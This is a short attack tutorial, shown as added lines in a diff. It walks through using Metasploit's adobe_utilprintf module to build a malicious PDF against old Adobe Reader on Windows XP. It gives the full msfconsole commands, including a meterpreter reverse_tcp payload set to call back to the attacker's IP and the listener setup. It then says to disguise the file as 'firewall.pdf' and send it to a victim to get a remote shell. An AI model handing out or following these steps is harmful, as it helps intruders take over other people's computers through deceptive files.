@@ -1,0 +1,26 @@
+
+Hack Remote XP PC using Adobe util.printf() Buffer Overflow
+
+This module exploits a buffer overflow in Adobe Reader and Adobe Acrobat Professional < 8.1.3. By creating a specially crafted pdf that a contains malformed util.printf() entry, an attacker may be able to execute arbitrary code.
+Adobe PDF 8.1.2
+Windows XP SP 2
+Attacker: Backtrack 5
+Victim PC: Windows XP
+Open backtrack terminal type msfconsole
+
+Now type use exploit/windows/fileformat/adobe_utilprintf
+Msf exploit (adobe_utilprintf)>set payload windows/meterpreter/reverse_tcp
+Msf exploit (adobe_utilprintf)>set lhost 192.168.1.3 (IP of Local Host)
+Msf exploit (adobe_utilprintf)>set filename firewall.pdf
+Msf exploit (adobe_utilprintf)>exploit
+
+After we successfully generate the malicious PDF File, it will stored on your local computer
+/root/.msf4/local/firewall.pdf
+
+Now we need to set up a listener to handle reverse connection sent by victim when the exploit successfully executed.
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set lhost 192.168.1.3
+exploit 
+Now send your firewall.pdf files to victim, as soon as they download and open it. Now you can access meterpreter shell on victim computer.
+
